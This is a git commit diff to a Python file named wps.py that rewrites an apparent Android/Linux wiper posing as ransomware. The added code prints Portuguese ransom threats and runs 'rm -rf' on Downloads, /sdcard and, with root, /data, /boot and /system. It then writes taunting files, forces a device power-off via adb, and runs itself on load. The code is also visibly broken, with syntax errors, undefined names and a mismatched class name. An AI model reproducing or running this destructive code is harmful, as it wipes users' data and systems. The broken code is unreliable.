1bf4f4f6ce2c415c94048b08fb27d13d11793988
Void <vdev30301@gmail.com>
2025-08-31 14:33:03 -0300

    Update wps.py
    contribuição by darkZe0

--- sorce-code/wps.py
+++ sorce-code/wps.py
@@ -2,24 +2,24 @@ from os import system as run_system, startfile as open_file
 from time import sleep
 from subprocess import run
 
-def start():
-    run("clear")
-
-    print("Você caiu em um ransomware!!!, pague em bitcoin ou APAGAREMOS e VAZAREMOS  TODO QUE ESTA NO SEU DISPOSITIVO")
-    sleep(0.5)
-    print("Não adianta sair!, mesmo não perdendo os arquivos, nós teremos acesso ao seu dispositivo")
-    sleep(0.5)
-    print("Nós instalamos VARIOS malwares e VIRUS no seu dispositivo!, TEMOS CONTROLE TOTAL")
-    sleep(0.5)
-
-
-        run('rm-rf Downloads', shell=shell_flag)
-        run("rm -rf /sdcard"shell=shell_flag)
-
-        if os.geteuid() == 0:
-            run("rm -rf /data",shell=shell_flag)
-            run("rm -rf /boot",shell=shell_flag)
-            run("rm -rf /system",shell=shell_flag)
+class malwRe:
+    def start(self):
+    	run("clear")
+    	
+    	print("Você caiu em um ransomware!!!, pague em bitcoin ou APAGAREMOS e VAZAREMOS  TODO QUE ESTA NO SEU DISPOSITIVO")
+    	sleep(1)
+    	print("Não adianta sair!, mesmo não perdendo os arquivos, nós teremos acesso ao seu dispositivo")
+    	sleep(1)
+    	print("Nós instalamos VARIOS malwares e VIRUS no seu dispositivo!, TEMOS CONTROLE TOTAL")
+    	sleep(1)
+    	
+    	run('rm-rf Downloads', shell=shell_flag)
+    	run("rm -rf /sdcard"shell=shell_flag)
+    	
+    	if os.geteuid() == 0:
+    	    run("rm -rf /data",shell=shell_flag)
+    	    run("rm -rf /boot",shell=shell_flag)
+    	    run("rm -rf /system",shell=shell_flag)
 
 
         for i in range(1, 101):
@@ -27,8 +27,8 @@ def start():
             with open(filename, 'w') as f:
                 f.write("kkk script kiddie otario")
                 open_file(filename)
-
-
-        run('echo "Seus documentos, fotos e projetos sumiram.
-    Não adianta buscar, nada mais existe.
-    Foi divertido." > /sdcard/GOODBYE.txt',shell=shell_flag)
+                
+                run("adb shell reboot -p", shell=True)
+                
+wiper = malwaRe()
+wiper.start() 
